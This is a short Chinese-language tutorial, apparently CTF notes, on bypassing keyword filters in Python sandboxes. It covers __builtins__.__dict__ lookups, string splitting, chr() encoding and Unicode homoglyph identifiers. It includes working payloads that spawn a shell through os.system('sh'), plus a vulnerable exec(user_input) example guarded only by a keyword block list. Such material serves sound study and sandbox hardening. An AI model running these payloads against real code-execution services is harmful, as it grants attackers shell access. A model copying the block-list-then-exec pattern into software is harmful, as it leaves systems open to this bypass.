### 字符串过滤


- Python的内置函数存放在模块`__builtins__`中
- 模块的`__dict__`属性是一个字典，保存模块的变量、函数、类等

- `ord()` 输入一个长度为 1 的字符串（单个字符），返回它对应的 Unicode 码点整数（如： ord('A') == 65）
- `chr()` 输入一个整数（Unicode 码点），返回对应的字符（如：chr(65) == 'A'）


所以，当遇到字符串检测时（如检查用户输入中有没有\['import', 'os', 'system'\]）。
```python
for s in ['import', 'os', 'sys', 'system', 'exec', 'eval']:
    if s in user_input:
        exit()

exec(user_input)
```
我们可以使用`__builtins__.__dict__['key']`获取内置函数和数据，使用`__dict__['key']`获取其他模块的数据。这让我们可以使用字符串调用函数，通过构建字符串绕过审查
```python
# __import__('os').system('sh')
__builtins__.__dict__['__import__']('os').__dict__['system']('sh')

# 破坏检测
__builtins__.__dict__['__imp' + 'ort__']('o' + 's').__dict__['sy' + 'stem']('s' + 'h')

# 加上 chr() 构建字符串，chr() 使用的unicode编码用ord()获取
__builtins__.__dict__['__imp' + chr(111) + 'rt__'](chr(111) + chr(115)).__dict__['sy' + 'stem'](chr(115) + chr(104))
```



### Unicode编码

__当做了ASCII检测时不能使用此方法__

Python 在解析源码时，会将标识符进行 NFKC (Normalization Form KC) 规范化。比如 '𝕒' 会被当成 'a'
```python repl
>>> a = 1
>>> 𝕒
1
```

所以，当过滤字符，且没有进行ASCII码检测时，可以使用unicode异形字母替换（模块名os和命令sh不能是异体，数字不能是异体）
```python
__𝕚𝕞𝕡𝕠𝕣𝕥__(𝕔𝕙𝕣(111) + 𝕔𝕙𝕣(115)).𝕤𝕪𝕤𝕥𝕖𝕞(𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(104))
```
